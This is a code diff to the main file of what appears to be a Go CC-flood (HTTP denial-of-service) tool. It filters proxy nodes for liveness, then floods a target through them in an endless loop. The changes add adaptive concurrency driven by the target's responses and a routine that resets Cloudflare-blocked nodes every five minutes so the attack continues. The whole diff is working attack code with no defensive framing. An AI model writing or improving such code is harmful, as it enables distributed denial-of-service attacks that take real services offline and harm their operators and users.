@@ -2,7 +2,9 @@ package main
 
 import (
 	"fmt"
+	"github.com/go-resty/resty/v2"
 	"io/ioutil"
+	"strings"
 	"sync"
 	"time"
 
@@ -36,7 +38,7 @@ func main() {
 	counts := 0
 	var (
 		alivePlist []utils.Nodes
-		status     int
+		resp       resty.Response
 	)
 
 	switch config.Cfg.FilterNode {
@@ -45,72 +47,91 @@ func main() {
 		go func() {
 			for {
 				if current != nil {
-					fmt.Printf("Filter Processing: %.2f%%\n", float32(*current*100)/float32(len(PList)))
+					fmt.Printf("\rFilter Processing: %.2f%%", float32(*current*100)/float32(len(PList)))
 					if *current == len(PList)-1 {
-						fmt.Printf("Filter Nodes: %d\n", len(alivePlist))
 						break
 					}
 					time.Sleep(5 * time.Second)
 				}
 			}
 		}()
-		go func() {
-			pool, _ := ants.NewPoolWithFunc(config.Cfg.Connections, func(i interface{}) {
-				p := i.(utils.Nodes)
-				aliveP, _ := utils.URLTest(&p)
-				if aliveP.Proxy != nil {
-					alivePlist = append(alivePlist, aliveP)
-				}
-				wg.Done()
-			})
 
-			//initial alive proxies
-			fmt.Println("Filtering alive nodes")
-			for i, p := range PList {
-				current = &i
-				wg.Add(1)
-				err = pool.Invoke(p)
-				if err != nil {
-					fmt.Println(err.Error())
-				}
+		var wg sync.WaitGroup
+		pool, _ := ants.NewPoolWithFunc(config.Cfg.Connections, func(i interface{}) {
+			p := i.(utils.Nodes)
+			aliveP, _ := utils.URLTest(&p)
+			if aliveP.Proxy != nil {
+				alivePlist = append(alivePlist, aliveP)
 			}
-			pool.Release()
-		}()
+			wg.Done()
+		})
+
+		//initial alive proxies
+		fmt.Printf("\nFiltering alive nodes\n")
+		for i, p := range PList {
+			current = &i
+			wg.Add(1)
+			err = pool.Invoke(p)
+			if err != nil {
+				fmt.Println(err.Error())
+			}
+		}
+		wg.Wait()
+		pool.Release()
+		fmt.Printf("\nFilter Nodes: %d", len(alivePlist))
 	default:
 		alivePlist = PList
 	}
 
-	pool2, _ := ants.NewPoolWithFunc(config.Cfg.Connections, func(i interface{}) {
-		p := i.(utils.Nodes)
-		_ = utils.CCAttack(&p, &counts, &status)
+	pool, _ := ants.NewPoolWithFunc(config.Cfg.Connections, func(i interface{}) {
+		p := i.(int)
+		_ = utils.CCAttack(&alivePlist[p], &counts, &resp)
 		wg.Done()
 	})
-	defer pool2.Release()
+	defer pool.Release()
 
 	//monitor status
 	go func() {
 		for {
 			switch {
-			case status >= 502 && pool2.Cap() > 24:
-				pool2.Tune(pool2.Cap() - 10)
-			case status <= 500 && status > 0 && pool2.Cap() < 3*config.Cfg.Connections:
-				pool2.Tune(pool2.Cap() + 30)
+			case strings.Contains(resp.String(), "cloudflare"):
+				break
+			case resp.StatusCode() > 499 && pool.Cap() > 24:
+				pool.Tune(pool.Cap() - 10)
+			case strings.Contains(resp.String(), "token is error") && pool.Cap() < 3*config.Cfg.Connections:
+				pool.Tune(pool.Cap() + 30)
 			}
-			fmt.Printf("Total attack: %d [%d nodes] - Current connection: %d - StatusCode: %d\n", counts, len(alivePlist), pool2.Running(), status)
-			time.Sleep(5 * time.Second)
+			i := 0
+			for _, v := range alivePlist {
+				if !v.CFCheck {
+					i++
+				}
+			}
+			fmt.Printf("\nTotal attack: %d [(%d/%d) nodes] - Current connection: %d - StatusCode: %d", counts, i, len(alivePlist), pool.Running(), resp.StatusCode())
+			time.Sleep(30 * time.Second)
+		}
+	}()
+
+	go func() {
+		for {
+			fmt.Printf("\nReset cloudflare status.")
+			for i := range alivePlist {
+				alivePlist[i].CFCheck = false
+			}
+			time.Sleep(300 * time.Second)
 		}
 	}()
 
 	for {
-		if len(alivePlist) > 0 {
-			for _, p := range alivePlist {
-				wg.Add(1)
-				err = pool2.Invoke(p)
-				if err != nil {
-					fmt.Println(err.Error())
+		switch {
+		case len(alivePlist) > 0:
+			for i, v := range alivePlist {
+				if !v.CFCheck {
+					wg.Add(1)
+					_ = pool.Invoke(i)
 				}
 			}
-		} else {
+		default:
 			time.Sleep(5 * time.Second)
 		}
 	}
